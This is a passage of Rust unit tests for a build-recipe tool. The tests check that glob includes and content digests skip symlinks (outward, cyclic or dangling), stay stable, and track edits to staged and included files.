        // benign outward link (the canonical `.venv -> /shared` shape) must not
        // reach the traversal guard and hard-fail as Escapes, and a cyclic link
        // must not abort with a FilesystemLoop. A real file under the descent is
        // still matched; the link's target is simply not included.
        let outer = tempfile::tempdir().unwrap();
        write(&outer.path().join("foreign.txt"), b"foreign");

        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(&root.join("real/a.txt"), b"a");
        // A benign outward symlink (whose target holds a `.txt` that would be
        // matched and rejected as Escapes if `**` descended through it).
        std::os::unix::fs::symlink(outer.path(), root.join("venv")).unwrap();
        // Add a directory self-link too; it would trigger FilesystemLoop if descended.
        std::os::unix::fs::symlink(".", root.join("loop")).unwrap();

        // src == "." so project_root == context_root; `**/*.txt` descends into
        // every child dir, so it exercises read_child_dirs at the root.
        let matches = resolve_includes(root, root, &["**/*.txt".to_string()])
            .expect("a symlinked subdir under ** must be skipped, not abort");
        let relatives: Vec<_> = matches.iter().map(|m| m.relative.clone()).collect();
        // The real file is matched; the escaping link's foreign `.txt` target is
        // not staged and neither link aborts the descent.
        assert_eq!(relatives, vec![PathBuf::from("real/a.txt")]);
    }

    #[test]
    fn content_digest_tracks_file_content() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.py"), b"print(1)").unwrap();
        let recipe = Recipe::from_json(
            &serde_json::json!({"name":"a","build":{"project":{"src":"."}}}).to_string(),
        )
        .unwrap();
        let first = recipe_content_digest(Some(&recipe), Some(dir.path()))
            .unwrap()
            .unwrap();
        std::fs::write(dir.path().join("a.py"), b"print(2)").unwrap();
        let second = recipe_content_digest(Some(&recipe), Some(dir.path()))
            .unwrap()
            .unwrap();
        assert_ne!(
            first, second,
            "editing staged content must change the digest"
        );
    }

    #[cfg(unix)]
    #[test]
    fn content_digest_skips_symlinks_and_is_stable_under_cycle_or_dangling() {
        // hash_path_tree and copy_tree make the same skip decision: a
        // symlink within the tree is not hashed (so it never leaks out-of-tree
        // bytes into the digest), and a cyclic/dangling link does not abort the
        // hash. Editing a symlink target reachable only through the link leaves
        // the digest unchanged; such assets must be carried via `include`, not
        // by silently following links.
        let target_root = tempfile::tempdir().unwrap();
        let real = target_root.path().join("real");
        std::fs::create_dir_all(&real).unwrap();
        std::fs::write(real.join("data.bin"), b"v1").unwrap();

        let src_dir = tempfile::tempdir().unwrap();
        std::fs::write(src_dir.path().join("kept.py"), b"print(1)").unwrap();
        // A symlinked dir whose target lives OUTSIDE src (reachable only through
        // the link), a directory self-link (cycle), and a dangling link.
        std::os::unix::fs::symlink(&real, src_dir.path().join("link")).unwrap();
        std::os::unix::fs::symlink(".", src_dir.path().join("cycle")).unwrap();
        std::os::unix::fs::symlink(
            src_dir.path().join("does-not-exist"),
            src_dir.path().join("dangling"),
        )
        .unwrap();

        let recipe = Recipe::from_json(
            &serde_json::json!({"name":"a","build":{"project":{"src":"."}}}).to_string(),
        )
        .unwrap();
        // The cyclic/dangling links must not abort the hash.
        let first = recipe_content_digest(Some(&recipe), Some(src_dir.path()))
            .unwrap()
            .unwrap();
        // Editing the symlink target must not change the digest: the link entry
        // is skipped, matching copy_tree's staging behavior.
        std::fs::write(real.join("data.bin"), b"v2-longer").unwrap();
        let second = recipe_content_digest(Some(&recipe), Some(src_dir.path()))
            .unwrap()
            .unwrap();
        assert_eq!(
            first, second,
            "a skipped symlink's target must not affect the digest"
        );
    }

    #[test]
    fn content_digest_tracks_include_glob_assets_above_src() {
        // An `include`d asset above src (a sibling not carried by the src-tree
        // copy/hash) must still be folded into the digest, so editing it rebuilds
        // the image. Using an above-src asset isolates the include logic: the
        // src-tree hash alone would not cover it.
        let dir = tempfile::tempdir().unwrap();
        let context_root = dir.path();
        std::fs::create_dir_all(context_root.join("pkg")).unwrap();
        std::fs::write(context_root.join("pkg/code.py"), b"code").unwrap();
        std::fs::create_dir_all(context_root.join("assets")).unwrap();
        std::fs::write(context_root.join("assets/scene.json"), b"a").unwrap();

        let recipe = Recipe::from_json(
            &serde_json::json!({
                "name":"a",
                "build":{"project":{"src":"pkg","include":["../assets/**"]}}
            })
            .to_string(),
        )
        .unwrap();
        let first = recipe_content_digest(Some(&recipe), Some(context_root))
            .unwrap()
            .unwrap();
        std::fs::write(context_root.join("assets/scene.json"), b"changed-longer").unwrap();
        let second = recipe_content_digest(Some(&recipe), Some(context_root))
            .unwrap()
            .unwrap();
        assert_ne!(
            first, second,
            "editing an included above-src asset must change the digest"
        );
    }
}
